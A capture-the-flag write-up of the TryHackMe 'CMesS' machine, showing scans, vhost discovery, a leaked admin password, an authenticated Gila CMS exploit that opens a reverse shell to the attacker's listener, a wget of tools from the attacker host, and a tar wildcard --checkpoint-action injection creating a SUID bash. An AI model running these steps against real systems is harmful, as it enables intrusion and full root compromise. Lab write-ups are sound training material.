---
date: 2024-10-18
title: CMesS THM Write-Up
machine_ip: varies
os: Linux
difficulty: Medium
my_rating: 3
tags:
  - Linux
  - PrivEsc
  - Cron
  - "#Apache"
  - "#Gila"
  - "#CMS"
  - rustscan
  - feroxbuster
  - ffuf
  - whatweb
  - gobuster
  - Wildcards
  - Crontab
  - Enum
  - linpeas
  - linux-exploit-suggester
  - nc
  - ssh
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
└─# rustscan -a 10.10.179.92 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.179.92:22
Open 10.10.179.92:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.179.92
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 16:28 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating SYN Stealth Scan at 16:28
Scanning cmess.thm (10.10.179.92) [2 ports]
Discovered open port 22/tcp on 10.10.179.92
Discovered open port 80/tcp on 10.10.179.92
Completed SYN Stealth Scan at 16:28, 0.18s elapsed (2 total ports)
Initiating Service scan at 16:28
Scanning 2 services on cmess.thm (10.10.179.92)
Completed Service scan at 16:29, 63.04s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against cmess.thm (10.10.179.92)
Retrying OS detection (try #2) against cmess.thm (10.10.179.92)
Initiating Traceroute at 16:29
Completed Traceroute at 16:29, 3.02s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:29
Completed Parallel DNS resolution of 1 host. at 16:29, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.179.92.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:29
NSE Timing: About 97.54% done; ETC: 16:30 (0:00:01 remaining)
NSE Timing: About 99.65% done; ETC: 16:30 (0:00:00 remaining)
Completed NSE at 16:30, 70.55s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:30
Completed NSE at 16:30, 8.17s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:30
Completed NSE at 16:30, 0.00s elapsed
Nmap scan report for cmess.thm (10.10.179.92)
Host is up, received user-set (0.22s latency).
Scanned at 2024-10-18 16:28:19 PDT for 151s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18
|_http-generator: Gila CMS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/18%OT=22%CT=%CU=43210%PV=Y%DS=4%DC=T%G=N%TM=6712EFAA%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)
SEQ(SP=104%GCD=4%ISR=10D%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M509NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 207.992 days (since Sun Mar 24 16:41:56 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   87.19 ms  10.6.0.1
2   ... 3
4   354.92 ms cmess.thm (10.10.179.92)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:30
Completed NSE at 16:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:30
Completed NSE at 16:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:30
Completed NSE at 16:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.49 seconds
           Raw packets sent: 61 (4.304KB) | Rcvd: 1536 (770.867KB)
```
- ports 22 and 80 are open

- Web enumeration
	- feroxbuster
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r -k --url http://10.10.179.92    
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.179.92
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c http://10.10.179.92/src/?url=src
403      GET        9l       28w      277c http://10.10.179.92/themes/?url=themes
403      GET        9l       28w      277c http://10.10.179.92/lib/?url=lib
404      GET       86l      246w     3214c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       41l       99w     1583c http://10.10.179.92/admin
200      GET      107l      290w     3874c http://10.10.179.92/
200      GET       43l       98w     1366c http://10.10.179.92/login/password_reset
200      GET      109l      291w     3871c http://10.10.179.92/category
200      GET      109l      292w     3883c http://10.10.179.92/tag
200      GET      107l      290w     3860c http://10.10.179.92/blog
200      GET        0l        0w        0c http://10.10.179.92/api
404      GET        9l       31w      274c http://10.10.179.92/assets/icons/
404      GET        9l       31w      274c http://10.10.179.92/assets/icons/blank.gif
200      GET       14l       40w      566c http://10.10.179.92/assets/?url=assets
200      GET        4l       66w    31000c http://10.10.179.92/lib/font-awesome/css/font-awesome.min.css
200      GET        0l        0w    15763c http://10.10.179.92/lib/gila.min.css
200      GET      107l      290w     3860c http://10.10.179.92/search
200      GET       68l      422w    25046c http://10.10.179.92/assets/gila-logo.png
200      GET       41l       99w     1583c http://10.10.179.92/login
200      GET       41l       99w     1583c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      107l      290w     3860c http://10.10.179.92/index
200      GET      102l      308w     4090c http://10.10.179.92/1
200      GET        0l        0w        0c http://10.10.179.92/login/callback
200      GET        0l        0w        0c http://10.10.179.92/fm
500      GET        0l        0w        0c http://10.10.179.92/cm
200      GET       92l      266w     3345c http://10.10.179.92/About
200      GET        1l        4w       68c http://10.10.179.92/login/Register
200      GET      102l      308w     4090c http://10.10.179.92/01
200      GET      107l      290w     3860c http://10.10.179.92/Index
200      GET       21l       42w      735c http://10.10.179.92/Feed
200      GET      107l      290w     3860c http://10.10.179.92/SEARCH
200      GET       92l      266w     3345c http://10.10.179.92/ABOUT
200      GET      102l      308w     4090c http://10.10.179.92/1qaz2wsx
200      GET      109l      292w     3883c http://10.10.179.92/Tag
```
- Web server is #Apache and running #Gila CMS
- there is an `admin` login page
- ffuf for vhost enumeration
```
┌──(root㉿swabby)-[~/Downloads]
└─# ffuf -w /usr/share/seclists/SecLists-master/Discovery/DNS/shubs-subdomains.txt -u http://10.10.218.218 -H "HOST: FUZZ.cmess.thm". -fs 3904,3886,3883,3877,3895,3889,3880,3910,3892,3898  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.218.218
 :: Wordlist         : FUZZ: /usr/share/seclists/SecLists-master/Discovery/DNS/shubs-subdomains.txt
 :: Header           : Host: FUZZ.cmess.thm.
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3904,3886,3883,3877,3895,3889,3880,3910,3892,3898
________________________________________________

admissions              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 159ms]
s                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 168ms]
blackboard              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 163ms]
i                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 164ms]
dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 153ms]
biblioteca              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 162ms]
developers              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 170ms]
e                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 160ms]
t                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 168ms]
registration            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 160ms]
repository              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 162ms]
reservations            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 166ms]
v                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 184ms]
a                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 181ms]
webadvisor              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 180ms]
ekaterinburg            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 161ms]
c                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 213ms]
commencement            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 207ms]
membership              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 200ms]
m                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 4992ms]
d                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 163ms]
obituaries              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 165ms]
b                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 161ms]
university              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 178ms]
vestibular              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 174ms]
g                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 209ms]
psychology              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 165ms]
financialaid            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 164ms]
www.comune              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 157ms]
www.alumni              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 168ms]
p                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 245ms]
newsletter              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 199ms]
```
- `dev` stands out as its size is different from the others. 

- whatweb ouptput
```
┌──(root㉿kali)-[~/Transfer]
└─# whatweb 10.10.179.92     
http://10.10.179.92 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.179.92], MetaGenerator[Gila CMS], Script
```

- see `dev.cmess.thm`
	- MUST ALSO ADD TO `/etc/hosts` file with same IP as `cmess.thm` (because it is a virtual host)
	- This site shows the Development Log showing a reset password in clear text
```
## Development Log

### andre@cmess.thm

Have you guys fixed the bug that was found on live?

### support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!

### support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances

### andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.

### support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```
- We can login to the admin panel 
	- `andre@cmess.thm:KPFTN_f2yxe%`
	- from here we can now see the version of Gila CMS
		- `Gila CMS version 1.10.9`

---
# Foothold

- gain shell via exploit
- Looking for an exploit for Gila CMS version 1.10.9, we find this [exploit](https://www.exploit-db.com/exploits/51569) that gives use RCE if we have authentication
	- Exploit successfully generated a webshell
```
┌──(root㉿swabby)-[~/Downloads]
└─# python 51569.py              
  File "51569.py", line 15
SyntaxError: Non-ASCII character '\xe2' in file 51569.py on line 16, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details
                                                                                                                    
┌──(root㉿swabby)-[~/Downloads]
└─# python3 51569.py                  

 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗                             
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝                             
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗                               
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝                               
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗                             
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝                             
                                                                                                                    
                              by Unknown_Exploit                                                                    
                                                                                                                    
Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin
Enter the email: andre@cmess.thm
Enter the password: KPFTN_f2yxe%
Enter the local IP (LHOST): 10.2.1.119
Enter the local port (LPORT): 1337
File uploaded successfully.
```

- Caught shell with `nc` on port 1337
```
┌──(root㉿swabby)-[~/Downloads]
└─# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.218.218] 49622
bash: cannot set terminal process group (736): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cmess:/var/www/html/tmp$ whoami
whoami
www-data
```

- Checking attack vectors using my Linux PrivEsc notes
```
www-data@cmess:/var/www/html/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```
- we see a cron job runs every 30 seconds backing up andres home folder,
	- NOTE there is a wildcard! Just what we needed
	- but we are www-data and cant edit andre's folder
	- On the admin page we find a `config.php` file with the following lines
```
	'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
```
- Not providing access to SSH, must enumerate more

## Pivot to user andre

- manual enumeration of files led us to find:
```
www-data@cmess:/opt$ cat .password.bak
cat .password.bak
andres backup password
UQfsdCB7aAP6
```
- Knowing they have SSH open, we can ssh to `andre:UQfsdCB7aAP6`
```
┌──(root㉿kali)-[~/Transfer]
└─# ssh andre@10.10.144.140
andre@10.10.144.140's password: 

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
andre@cmess:~$ whoami
andre
```

- User flag - andre
```
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

---
# PrivEsc

- escalate to root
- Move to `/tmp` and use `wget` from RHOST and `SimpleHTTPServer` from LHOST to run automated privesc suggester tools
- #linux-exploit-suggester 
```
www-data@cmess:/tmp$ wget http://10.6.15.124:80/linux-exploit-suggester.sh
wget http://10.6.15.124:80/linux-exploit-suggester.sh
--2024-10-20 13:05:16--  http://10.6.15.124/linux-exploit-suggester.sh
Connecting to 10.6.15.124:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90858 (89K) [text/x-sh]
Saving to: 'linux-exploit-suggester.sh'

     0K .......... .......... .......... .......... .......... 56%  169K 0s
    50K .......... .......... .......... ........             100%  284K=0.4s

2024-10-20 13:05:17 (205 KB/s) - 'linux-exploit-suggester.sh' saved [90858/90858]
```
- Ran the same with #linpeas 

- Crontab wildcard exploit identified found manually during enumeration
- Proceed to escalate to root:
```
andre@cmess:~/backup$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
andre@cmess:~/backup$ chmod +x runme.sh 
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh

andre@cmess:~/backup$ ll
total 16
drwxr-x--- 2 andre andre 4096 Oct 20 14:21 ./
drwxr-x--- 4 andre andre 4096 Oct 20 14:14 ../
-rw-rw-r-- 1 andre andre    0 Oct 20 14:21 --checkpoint=1
-rw-rw-r-- 1 andre andre    0 Oct 20 14:21 --checkpoint-action=exec=sh runme.sh
-rwxr-x--- 1 andre andre   51 Feb  9  2020 note*
-rwxrwxr-x 1 andre andre   43 Oct 20 14:21 runme.sh*
```

- wait 2 minutes, run `/tmp/bash -p`
```
andre@cmess:~/backup$ /tmp/bash -p
bash-4.3# whoami
root
```

- Root flag
```
bash-4.3# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```